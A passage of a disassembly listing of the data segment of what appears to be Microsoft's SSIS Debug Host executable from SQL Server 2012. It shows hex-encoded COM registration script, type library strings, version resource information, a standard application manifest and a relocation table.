word_B54A       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 1B8h, 2 dup(0)
                dd 4, 10000h
dword_B560      dd 409h, 1C8h, 0E1FCh, 77h
                                        ; DATA XREF: CODE:0000A3C4↑o
                dd offset sub_4E4
dword_B574      dd 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 0E274h, 23Ah
off_B580        dd offset sub_4E4, 0    ; DATA XREF: CODE:0000A3C4↑o
                db 0B0h, 0E4h
word_B58A       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 0Eh
                dd offset sub_4E4, 0
                dd offset dword_E4C0, offset loc_970
                dd offset sub_4E4, 0
                db 30h, 0EEh
word_B5AA       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 16Eh
                dd offset sub_4E4, 0
                dd offset dword_EFA0
                db 0A8h, 4
word_B5BE       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd offset sub_4E4, 0
dword_B5C8      dd 0F448h, 15Ah         ; DATA XREF: CODE:0000A3C4↑o
                dd offset sub_4E4
                db 2 dup(0)
word_B5D6       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
aRegistr:                               ; DATA XREF: CODE:0000A3C4↑o
                text "UTF-16LE", 8,'REGISTR'
aYTypelib:                              ; DATA XREF: CODE:0000A3C4↑o
                                        ; CODE:00011E78↓o
                text "UTF-16LE", 'Y',7,'TYPELIB',0
                db 48h, 4Bh
word_B5FE       dw 5243h                ; DATA XREF: CODE:0000A3C4↑o
                                        ; CODE:00011E78↓o
                dd 0D7B0A0Dh, 6F4E090Ah, 6F6D6552h, 41206576h, 44497070h
                dd 7B090A0Dh
dword_B618      dd 9090A0Dh, 50412527h, 25444950h, 203D2027h
                                        ; DATA XREF: CODE:0000A3C4↑o
                                        ; CODE:00011E78↓o
                db 73h, 20h
word_B62A       dw 4427h                ; DATA XREF: CODE:0000A3C4↑o
                                        ; CODE:00011E78↓o
                dd 6F487274h, 0D277473h, 2709090Ah
                db 44h, 74h
word_B63A       dw 4872h                ; DATA XREF: CODE:0000A3C4↑o
                                        ; CODE:00011E78↓o
                dd 2E74736Fh, 27455845h, 9090A0Dh, 90A0D7Bh, 61760909h
                dd 7041206Ch, 20444970h, 2073203Dh, 50412527h, 25444950h
                dd 90A0D27h, 2 dup(0A0D7D09h), 500A0D7Dh, 52434B48h, 0D7B0A0Dh
dword_B67C      dd 7444090Ah, 736F4872h, 6F482E74h, 332E7473h
                                        ; DATA XREF: CODE:0000A4F0↑o
                                        ; CODE:00011F10↓o
                db 20h, 3Dh
word_B68E       dw 7320h                ; DATA XREF: CODE:0000A4F0↑o
                                        ; CODE:00011F10↓o
                dd 6F482720h, 43207473h, 7373616Ch, 90A0D27h
dword_B6A0      dd 90A0D7Bh, 534C4309h, 3D204449h, 27207320h, 4334347Bh
                                        ; DATA XREF: CODE:0000A4F0↑o
                                        ; CODE:00011F10↓o
                dd 45363430h
dword_B6B8      dd 45432D44h, 342D4638h, 2D444631h, 42353138h, 3937422Dh
                                        ; DATA XREF: CODE:0000A4F0↑o
                                        ; CODE:00011F10↓o
                dd 39324246h
dword_B6D0      dd 43373732h, 0D277D37h, 0D7D090Ah, 7444090Ah, 736F4872h
                                        ; DATA XREF: CODE:0000A4F0↑o
                                        ; CODE:00011F10↓o
                dd 6F482E74h
                db 73h, 74h
word_B6EA       dw 3D20h                ; DATA XREF: CODE:0000A4F0↑o
                                        ; CODE:00011F10↓o
                dd 27207320h, 74736F48h, 616C4320h, 0D277373h
                db 0Ah, 9
word_B6FE       dw 0D7Bh                ; DATA XREF: CODE:0000A4F0↑o
                                        ; CODE:00011F10↓o
                dd 4309090Ah, 4449534Ch, 73203D20h, 347B2720h, 34304334h
                dd 2D444536h, 46384543h, 4631342Dh, 31382D44h
                db 35h, 42h
word_B726       dw 422Dh                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                dd 42463937h, 37323932h, 7D374337h, 90A0D27h, 72754309h
dword_B73C      dd 20726556h, 2073203Dh, 72744427h, 74736F48h, 736F482Eh
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 27332E74h, 7D090A0Dh
                db 0Dh, 0Ah
word_B75A       dw 4E09h                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 6D65526Fh, 2065766Fh, 49534C43h, 90A0D44h
dword_B76C      dd 90A0D7Bh, 726F4609h, 65526563h, 65766F6Dh
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B77C      dd 34347B20h, 36343043h, 432D4445h, 2D463845h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B78C      dd 44463134h, 3531382Dh, 37422D42h, 32424639h, 37373239h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 207D3743h, 2073203Dh
dword_B7A8      dd 736F4827h, 6C432074h, 27737361h, 9090A0Dh, 90A0D7Bh
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B7BC      dd 72500909h, 4449676Fh, 73203D20h, 74442720h, 736F4872h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 6F482E74h
                db 73h, 74h
word_B7D6       dw 332Eh                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 90A0D27h, 65560909h, 6F697372h
                db 6Eh, 49h
word_B7E6       dw 646Eh                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 6E657065h, 746E6564h, 676F7250h, 3D204449h, 27207320h
                dd 48727444h
dword_B800      dd 2E74736Fh, 74736F48h, 90A0D27h, 6F460909h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B810      dd 52656372h, 766F6D65h, 50272065h, 72676F72h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B820      dd 616D6D61h, 27656C62h, 9090A0Dh, 636F4C09h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 61h, 6Ch
word_B832       dw 6553h                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 72657672h, 3D203233h, 27207320h
                db 25h, 4Dh
word_B842       dw 444Fh                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 25454C55h, 90A0D27h, 61760909h, 7041206Ch, 20444970h
                dd 2073203Dh
                db 27h, 25h
word_B85E       dw 5041h                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 25444950h, 90A0D27h, 54270909h, 4C657079h, 20276269h
dword_B874      dd 2073203Dh, 37337B27h, 41443644h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B880      dd 462D4631h, 2D334635h, 34324234h, 3437392Dh, 34372D36h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 32h, 41h
word_B896       dw 3234h                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 42413834h, 277D3339h, 9090A0Dh, 90A0D7Dh
                db 7Dh, 0Dh
word_B8AA       dw 7D0Ah                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 41500A0Dh, 52434B48h, 0D7B0A0Dh
                db 0Ah, 0Dh
word_B8BA       dw 7D0Ah                ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 41500A0Dh, 5446534Dh, 10002h, 0
dword_B8CC      dd 409h, 0              ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 41h, 1
                db 2 dup(0)
word_B8DE       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 2, 3 dup(0)
dword_B8F0      dd 13h, 0A0h, 0         ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 2 dup(0FFh)
word_B8FE       dw 0FFFFh               ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0FFFFFFFFh, 20h, 80h
                db 1, 0
word_B90E       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 1, 0
                db 64h, 0
word_B91A       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 14Ch, 0C8h, 0FFFFFFFFh
                db 0Fh, 0
word_B92A       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 31Ch, 0Ch, 0FFFFFFFFh, 0Fh
                db 28h, 3
word_B93E       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 1Ch, 0FFFFFFFFh, 0Fh, 30Ch
dword_B950      dd 10h, 0FFFFFFFFh, 0Fh, 214h
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B960      dd 80h, 0FFFFFFFFh, 0Fh, 294h, 78h, 0FFFFFFFFh
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
dword_B978      dd 0Fh, 344h, 200h, 0FFFFFFFFh
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
dword_B988      dd 0Fh, 544h, 1A0h      ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 2 dup(0FFh)
word_B996       dw 0FFFFh               ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0Fh, 6E4h
                db 0E4h, 0
word_B9A2       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0FFFFFFFFh, 0Fh
                db 0C8h, 7
word_B9AE       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 30h, 0FFFFFFFFh, 0Fh
                db 2 dup(0FFh)
word_B9BE       dw 0FFFFh               ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0
                dd 0FFFFFFFFh, 0Fh
                db 2 dup(0FFh)
word_B9CE       dw 0FFFFh               ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0
                dd 0FFFFFFFFh, 0Fh
dword_B9DC      dd 0FFFFFFFFh, 0        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0FFFFFFFFh, 0Fh, 0FFFFFFFFh
dword_B9F0      dd 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0FFFFFFFFh, 0Fh, 0FFFFFFFFh, 0
                db 2 dup(0FFh)
word_BA06       dw 0FFFFh               ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0Fh, 2225h, 7F8h, 0
dword_BA18      dd 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 3, 3 dup(0)
dword_BA2C      dd 3 dup(0)             ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 18h, 2
dword_BA40      dd 18h, 0               ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 44h, 2 dup(0)
dword_BA54      dd 0FFFFFFFFh, 1, 4     ; DATA XREF: CODE:0000A3C4↑o
                db 2 dup(0)
word_BA62       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 2 dup(0)
                dd 0FFFFFFFFh
                db 34h, 22h
word_BA72       dw 1                    ; DATA XREF: CODE:0000A3C4↑o
                dd 7F8h, 2 dup(0)
                db 3, 0
word_BA82       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 0
                db 5, 4 dup(0)
                align 10h
                db 2 dup(0)
word_BA92       dw 0                    ; DATA XREF: CODE:0000A3C4↑o
                dd 2 dup(0)
                dd 60h
                db 0C0h, 11h
word_BAA2       dw 0                    ; DATA XREF: CODE:0000A3B0↑o
                                        ; CODE:00011DD0↓o
                dd 28h, 0
                dd 70h, 2 dup(0)
                dd 0FFFFFFFFh
dword_BABC      dd 300001h, 4, 1, 70002h, 0
                                        ; DATA XREF: CODE:0000A3B0↑o
                                        ; CODE:00011DD0↓o
                dd 0FFFFFFFFh
                db 2 dup(0FFh)
word_BAD6       dw 0FFFFh               ; DATA XREF: CODE:0000A3B0↑o
                                        ; CODE:00011DD0↓o
                dd 0FFFFFFFFh, 48h, 8 dup(0FFFFFFFFh), 60h, 18h, 0FFFFFFFFh
                db 2 dup(0FFh)
word_BB0E       dw 0FFFFh               ; DATA XREF: CODE:0000A4E4↑o
                                        ; CODE:00011F04↓o
                dd 3 dup(0FFFFFFFFh), 30h, 0FFFFFFFFh
dword_BB24      dd 0                    ; DATA XREF: CODE:0000A4E4↑o
                                        ; CODE:00011F04↓o
                dd 6 dup(0FFFFFFFFh)
                db 2 dup(0FFh)
word_BB42       dw 0FFFFh               ; DATA XREF: CODE:0000A4B8↑o
                                        ; CODE:00011ED8↓o
                dd 4 dup(0FFFFFFFFh), 37D6DA1Fh
dword_BB58      dd 4B24F5F3h, 2A744697h, 93AB4842h, 0FFFFFFFEh, 0FFFFFFFFh
                                        ; DATA XREF: CODE:0000A4B8↑o
                                        ; CODE:00011ED8↓o
                dd 44C046EDh, 41FDCE8Fh, 9FB75B81h
                db 0B2h, 92h
word_BB7A       dw 0C777h               ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                align 10h
                dd 0FFFFFFFFh, 20430h
dword_BB88      dd 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                dd 0C0h, 46000000h
dword_BB94      dd 2, 0FFFFFFFFh, 20400h, 0
                                        ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011C9C↓o
                db 0C0h, 0
word_BBA6       dw 0                    ; DATA XREF: CODE:0000A27C↑o
                                        ; CODE:00011D90↓o
                dd 46000000h, 1, 0FFFFFFFFh, 27271279h, 491D96EEh, 31D92F98h
                dd 5334C5F3h, 64h, 0FFFFFFFFh, 64h, 1, 2 dup(0FFFFFFFFh)
                dd 3010000h, 0
                dd 48h, 30h, 0
                dd 2, 7473002Dh, 656C6F64h, 6C742E32h, 57575762h, 6 dup(0FFFFFFFFh)
                dd 148h, 2 dup(0FFFFFFFFh), 18h, 2 dup(0FFFFFFFFh), 184h
                dd 6 dup(0FFFFFFFFh), 0F4h, 28h, 2 dup(0FFFFFFFFh), 0
                dd 5 dup(0FFFFFFFFh), 0B4h, 6 dup(0FFFFFFFFh), 0C4h, 5 dup(0FFFFFFFFh)
                dd 3Ch, 2 dup(0FFFFFFFFh), 0E0h, 16h dup(0FFFFFFFFh), 54h
                dd 0Bh dup(0FFFFFFFFh), 7Ch, 4 dup(0FFFFFFFFh), 170h, 8 dup(0FFFFFFFFh)
                dd 64h, 11h dup(0FFFFFFFFh), 11Ch, 6 dup(0FFFFFFFFh), 130h
                dd 0FFFFFFFFh, 9Ch, 4 dup(0FFFFFFFFh), 158h, 3 dup(0FFFFFFFFh)
                dd 0BA17000Ah, 48727444h, 4C74736Fh, 57576269h, 0
                dd 0FFFFFFFFh, 9C893804h, 74736F48h, 64h, 0FFFFFFFFh, 5A943805h
                dd 736F4849h, 57575774h, 64h, 0FFFFFFFFh, 25AA0009h, 636F7250h
                dd 49737365h, 57575744h, 2 dup(0FFFFFFFFh), 0ECC40004h
                dd 6C615670h, 64h, 0FFFFFFFFh, 0B35E000Ch, 61657243h, 74446574h
                dd 70704173h, 2 dup(0FFFFFFFFh), 0EF500011h
aDtsapplication db 'dtsApplication100WWWd',0
                align 4
                db 0FFh
                db 3 dup(0FFh)
                db    9
                align 2
                dw 4C79h
                db  54h ; T
                db 65h, 72h, 6Dh
                db  69h ; i
                db 6Eh, 61h, 74h
                db  65h ; e
                db 3 dup(57h)
                db 0FFh
                db 3 dup(0FFh)
                db 0FFh
                db 3 dup(0FFh)
                db    4
                align 2
                dw 3A1Dh
aSyncd          db 'syncd',0
                align 4
                db 0FFh
                db 3 dup(0FFh)
                db  0Dh
                align 2
                dw 2A4h
                db  4Dh ; M
                db 61h, 72h, 73h
                db  68h ; h
                db 61h, 6Ch, 42h
                db  75h ; u
                db 2 dup(66h), 65h
                db  72h ; r
                db 3 dup(57h)
                db 0FFh
                db 3 dup(0FFh)
                db 0FFh
                db 3 dup(0FFh)
                db    6
                align 2
                dw 0CB2Dh
                db  62h ; b
                db 75h, 2 dup(66h)
                db  65h ; e
                db 72h, 2 dup(57h)
                db 0FFh
                db 3 dup(0FFh)
                db 0FFh
                db 3 dup(0FFh)
                db    8
                align 2
                dw 5B13h
                db  64h ; d
                db 77h, 52h, 6Fh
                db  77h ; w
                db 43h, 6Eh, 74h
                db 0FFh
                db 3 dup(0FFh)
                db 0FFh
                db 3 dup(0FFh)
                db    8
                align 2
                dw 4DFEh
                db  64h ; d
                db 77h, 43h, 6Fh
                db  6Ch ; l
                db 43h, 6Eh, 74h
                db 0FFh
                db 3 dup(0FFh)
                db 0FFh
                db 3 dup(0FFh)
                db    7
                align 2
                dw 3970h
                db  63h ; c
                db 6Fh, 6Ch, 75h
                db  6Dh ; m
                db 6Eh, 73h, 57h
                db 0FFh
                db 3 dup(0FFh)
                db 0FFh
                db 3 dup(0FFh)
                db    9
                align 2
                dw 12F7h
                db  64h ; d
                db 77h, 52h, 6Fh
                db  77h ; w
                db 53h, 69h, 7Ah
                db  65h ; e
                db 3 dup(57h)
                db 0FFh
                db 3 dup(0FFh)
                db 0FFh
                db 3 dup(0FFh)
                db    4
                align 2
                dw 3B06h
                db  64h ; d
                db 61h, 74h, 61h
                db 0FFh
                db 3 dup(0FFh)
                db    8
                db 1, 2 dup(0)
                db  0Ah
                align 2
                dw 827Eh
                db  6Ch ; l
                db 69h, 6Eh, 65h
                db  61h ; a
                db 67h, 65h, 49h
                db  44h ; D
                db 73h, 2 dup(57h)
                db 0FFh
                db 3 dup(0FFh)
                db 0FFh
                db 3 dup(0FFh)
                db    8
                align 2
aUrordinalsd    db 'Urordinalsd',0
                align 4
                db 0FFh
                db 3 dup(0FFh)
                db  0Dh
                align 2
                dw 308Ch
aGetbufferinfow db 'GetBufferInfoWWW@',0
aSqlServer2005I db 'SQL Server 2005 Integration Services Debugging Host Type LibraryW'
                db 'W)',0
aIntegrationSer db 'Integration Services Debugging Host ClassW-',0
                dw 6E49h
                dd 72676574h, 6F697461h, 6553206Eh, 63697672h, 44207365h
                dd 67756265h, 676E6967h, 736F4820h, 6E492074h, 66726574h
                dd 57656361h, 72700012h, 7265706Fh, 50207974h, 65636F72h
                dd 44497373h, 656D0018h, 646F6874h, 65724320h, 41657461h
                dd 696C7070h, 69746163h, 57576E6Fh, 656D0010h, 646F6874h
                dd 72655420h, 616E696Dh, 57576574h, 4013001Ah, 80130013h
                dd 400D001Ah, 800D000Dh, 2011001Bh, 80110011h, 6011001Ah
                dd 10h, 2003001Bh, 80030016h, 6003001Ah, 20h, 138h, 2Ch
                dd 80190019h, 0
                dd 4C001Ch, 4411h, 1, 0
                dd 0A0h, 0
                dd 54h, 0Ah, 1002Ch, 80190019h, 0
                dd 4C0020h, 14409h, 1, 0
                dd 0B4h, 8, 7Ch, 0Ah, 2002Ch, 80190019h, 0
                dd 440024h, 20409h, 1, 0
                dd 0D0h, 80030003h, 0B4h, 0
                dd 30078h, 80190019h, 0
                dd 1040028h, 30409h, 8, 800D000Dh, 0E0h, 1, 0
                dd 0F4h, 2, 0
                dd 108h, 2, 18h, 11Ch, 2, 0
                dd 130h, 2, 18h, 148h, 2, 20h, 158h, 1, 28h, 170h, 2, 4003Ch
                dd 80190019h, 0
                dd 74002Ch, 40409h, 3, 800D000Dh, 0E0h, 1, 0
                dd 0F4h, 2, 0
                dd 108h, 2, 1, 2, 3, 4, 5, 3Ch, 64h, 9Ch, 0C4h, 184h, 0
                dd 2Ch, 58h, 84h, 0FCh, 2 dup(0)
aDtrhost:
                text "UTF-16LE", 7,'DtrHost'
                dd 4D001Ch, 630069h, 6F0072h, 6F0073h, 740066h, 530020h
                dd 490053h, 200053h, 650044h, 750062h, 670067h, 720065h
                dd 480020h, 73006Fh, 840074h, 680054h, 200065h, 780065h
                dd 630065h, 740075h, 620061h, 65006Ch, 20002Ch, 740064h
                dd 640073h, 620065h, 670075h, 6F0068h, 740073h, 65002Eh
                dd 650078h, 20002Ch, 610063h, 6E006Eh, 74006Fh, 620020h
                dd 200065h, 750072h, 20006Eh, 6E0069h, 730020h, 610074h
                dd 64006Eh, 6C0061h, 6E006Fh, 200065h, 6F006Dh, 650064h
                dd 20002Eh, 49000Ah, 200074h, 610063h, 20006Eh, 650062h
                dd 720020h, 6E0075h, 6F0020h, 6C006Eh, 200079h, 720066h
                dd 6D006Fh, 770020h, 740069h, 690068h, 20006Eh, 510053h
                dd 20004Ch, 650053h, 760072h, 720065h, 490020h, 74006Eh
                dd 670065h, 610072h, 690074h, 6E006Fh, 530020h, 720065h
                dd 690076h, 650063h, 2E0073h, 4 dup(0)
                dd 41500000h, 3404A8h, 560000h, 5F0053h, 450056h, 530052h
                dd 4F0049h, 5F004Eh, 4E0049h, 4F0046h, 0
                dd 0FEEF04BDh, 10000h, 7DB006Eh, 834003Ch, 0B0000h, 834003Ch
                dd 3Fh, 8, 40000h, 1, 3 dup(0)
                dd offset unk_406
                dd 530001h, 720074h, 6E0069h, 460067h, 6C0069h, 490065h
                dd 66006Eh, 6Fh, 3E2h, 300001h, 300034h, 300039h, 420034h
                dd 30h, 0D0032h, 500001h, 61006Ch, 660074h, 72006Fh, 6Dh
                dd 54004Eh, 490020h, 54004Eh, 4C0045h, 580020h, 360038h
                dd 0
                dd 4900BAh, 4C0001h, 670065h, 6C0061h, 720054h, 640061h
                dd 6D0065h, 720061h, 73006Bh, 0
aMicrosoftSqlSe:
                text "UTF-16LE", 'Microsoft SQL Server is a registered trademark of M'
                text "UTF-16LE", 'icrosoft Corporation.',0
                align 4
                db ' ',0
                dw 4
                dd 430001h, 6D006Fh, 65006Dh, 74006Eh, 73h, 510053h, 4Ch
                dd 50026h, 470001h, 6C006Fh, 650064h, 42006Eh, 740069h
                dd 73h, 720054h, 650075h, 0
                dd 16004Ch, 430001h, 6D006Fh, 610070h, 79006Eh, 61004Eh
                dd 65006Dh, 0
aMicrosoftCorpo:
                text "UTF-16LE", 'Microsoft Corporation',0
                db 'H',0
                dw 10h
                dd 460001h, 6C0069h, 440065h, 730065h, 720063h, 700069h
                dd 690074h, 6E006Fh, 0
aSsisDebugHost:
                text "UTF-16LE", 'SSIS Debug Host',0
                text "UTF-16LE", '|.'
                dd 460001h, 6C0069h, 560065h, 720065h, 690073h, 6E006Fh
                dd 0
a20110110210006:
                text "UTF-16LE", '2011.0110.2100.060 ((SQL11_RTM).120210-1846 )',0
                text "UTF-16LE", ':',0Dh
                dd 490001h, 74006Eh, 720065h, 61006Eh, 4E006Ch, 6D0061h
                dd 65h, 740044h, 440073h, 620065h, 670075h, 6F0048h, 740073h
                dd 0
                dd 25006Eh, 4C0001h, 670065h, 6C0061h, 6F0043h, 790070h
                dd 690072h, 680067h, 74h, 69004Dh, 720063h, 73006Fh, 66006Fh
                dd 200074h, 6F0043h, 700072h, 20002Eh, 6C0041h, 20006Ch
                dd 690072h, 680067h, 730074h, 720020h, 730065h, 720065h
                dd 650076h, 2E0064h, 0
                dd 11004Ah, 4F0001h, 690072h, 690067h, 61006Eh, 46006Ch
                dd 6C0069h, 6E0065h, 6D0061h, 65h, 740044h, 440073h, 620065h
                dd 670075h, 6F0048h, 740073h, 45002Eh, 450058h, 0
                dd 15004Ah, 500001h, 6F0072h, 750064h, 740063h, 61004Eh
                dd 65006Dh, 0
aMicrosoftSqlSe_0:
                text "UTF-16LE", 'Microsoft SQL Server',0
                align 4
                text "UTF-16LE", '>',0Dh
                dd 500001h, 6F0072h, 750064h, 740063h, 650056h, 730072h
                dd 6F0069h, 6Eh, 310031h, 30002Eh, 32002Eh, 300031h, 2E0030h
                dd 300036h, 0
                dd 44h, 560001h, 720061h, 690046h, 65006Ch, 6E0049h, 6F0066h
                dd 0
                dd 40024h, 540000h, 610072h, 73006Eh, 61006Ch, 690074h
                dd 6E006Fh, 0
                dd 4B00409h
aAssemblyXmlnsU db '<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersio'
                db 'n="1.0">',0Dh,0Ah
                db '  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">',0Dh,0Ah
                db '    <security>',0Dh,0Ah
                db '      <requestedPrivileges>',0Dh,0Ah
                db '        <requestedExecutionLevel level="asInvoker" uiAccess="fals'
                db 'e"></requestedExecutionLevel>',0Dh,0Ah
                db '      </requestedPrivileges>',0Dh,0Ah
                db '    </security>',0Dh,0Ah
                db '  </trustInfo>',0Dh,0Ah
                db '</assembly>PAPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADD'
                db 'INGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD',0
                db 10h, 2 dup(0)
                dd 88h, 32E032DCh, 32E832E4h, 32F032ECh, 330032F4h, 34403304h
                dd 34483444h, 3450344Ch, 34583454h, 348C3480h, 35E83498h
                dd 35F035ECh, 35F835F4h, 365C35FCh, 36643660h, 366C3668h
                dd 36743670h, 367C3678h, 36843680h, 368C3688h, 36943690h
                dd 369C3698h, 36B436B0h, 36BC36B8h, 36C436C0h, 37B437B0h
                dd 37BC37B8h, 3CA03C9Ch, 3CA83CA4h, 3CB03CACh, 3CB83CB4h
                dd 3CC03CBCh, 3CC4h, 2000h, 0C0h, 3144313Ch, 3154314Ch
                dd 3164315Ch, 3174316Ch, 3184317Ch, 3194318Ch, 31A4319Ch
                dd 38043800h, 380C3808h, 38143810h, 381C3818h, 38243820h
                dd 382C3828h, 38343830h, 383C3838h, 38443840h, 384C3848h
                dd 38543850h, 385C3858h, 38643860h, 386C3868h, 38743870h
                dd 394C3878h, 39543950h, 395C3958h, 39643960h, 396C3968h
                dd 39743970h, 39B839B4h, 3A443A40h, 3A583A54h, 3A783A60h
                dd 3B053AB8h, 3BC93B18h, 3C763C6Dh, 3C913C88h, 3CAE3C9Eh
                dd 3CEE3CD1h, 3D533D49h, 3D8E3D76h, 3D9D3D94h, 3DCD3DA4h
                dd 3EC13E39h, 3F3D3F0Ch, 3F9A3F81h, 3FF43FE2h
                dd 3000h, 0C0h, 302B3025h, 303B3034h, 30613044h, 30B8307Dh
                dd 310330E3h, 31123109h, 31253119h, 31D8315Fh, 3244322Fh
                dd 328E3274h, 32CF32C7h, 330A32D5h, 33573351h, 33D23386h
                dd 34103405h, 34D9348Dh, 35473516h, 35C7358Ah, 36A5362Fh
                dd 370636CDh, 37473720h, 37D137B1h, 380937E4h, 383D3837h
                dd 3897386Bh, 392E38FCh, 3946393Fh, 3A3739B1h, 3B7F3B09h
                dd 3BAB3B84h, 3C3C3C2Ch, 3CC63C63h, 3D1C3CCFh, 3D5E3D3Ah
                dd 3D8C3D83h, 3DA23D93h, 3E483E31h, 3E843E7Eh, 3ECB3E96h
                dd 3EF33EE3h, 3F433F22h, 3F673F62h, 3F813F73h, 3F8E3F89h
                dd 3FD93F9Ah, 3FDFh, 4000h, 0FCh, 30163011h, 305B3033h
                dd 30CE30C2h, 30DA30D4h, 30E530DFh, 311F311Ah, 31303125h
                dd 31703136h, 319C3194h, 31C731A8h, 31D931CCh, 31FB31DEh
                dd 32273201h, 324B3246h, 3279326Ah, 32993283h, 32CB32AEh
                dd 32ED32D0h, 332A32F8h, 33663355h, 338F337Eh, 33B233A9h
                dd 33DE33C1h, 33F833F0h, 34363407h, 3462344Ch, 34783468h
                dd 34BF34A5h, 34EA34D5h, 351034FFh, 355A3521h, 35E53583h
                dd 360135F4h, 36103608h, 366D364Ch, 36843677h, 36EE36E6h
                dd 371036F5h, 3730372Ah, 376C375Dh, 37783771h, 37B737A0h
                dd 380237FCh, 3855384Eh, 3878385Bh, 388B387Fh, 38CC38AFh
                dd 390538FCh, 39683915h, 39993980h, 3A0C39F0h, 3A593A29h
                dd 3A983A62h, 3B043AECh, 3B863B1Dh, 3BE43BC2h, 3BF33BEDh
                dd 3C393C31h, 3E083C40h, 3E693E55h, 3F093EFAh, 5000h, 170h
                dd 309E3056h, 30F930C8h, 31A1318Dh, 31D131C5h, 322B31FAh
                dd 32D632C2h, 330632FAh, 33233319h, 3330332Ah, 333A3335h
                dd 3344333Fh, 3352334Ah, 337F336Bh, 33923385h, 33AF33A6h
                dd 33D433CAh, 33F133E7h, 33FB33F6h, 3422341Dh, 3430342Bh
                dd 344E343Dh, 345B3454h, 3474346Fh, 34C134B7h, 34D034C7h
                dd 350C3504h, 351B3515h, 352F3523h, 35513546h, 35693557h
                dd 357C3571h, 358E3588h, 359D3597h, 35A735A2h, 35B335ACh
                dd 35CB35B9h, 35D935D3h, 35F035E5h, 361A360Eh, 36E73684h
                dd 375A374Eh, 37713766h, 378A3777h, 37AA379Fh, 37D837C0h
                dd 383137E2h, 383D3837h, 38493843h, 3856384Fh, 3864385Dh
                dd 3872386Bh, 38803879h, 38903888h, 38A43898h, 38B238ADh
                dd 38C238B8h, 38D638CBh, 38E738E2h, 38FC38F7h, 39083902h
                dd 3925391Eh, 393E3932h, 3955394Ah, 398B396Ah, 39FE39C3h
                dd 3A6E3A51h, 3AC93AAEh, 3AE43ACEh, 3B093AF0h, 3B9D3B4Ch
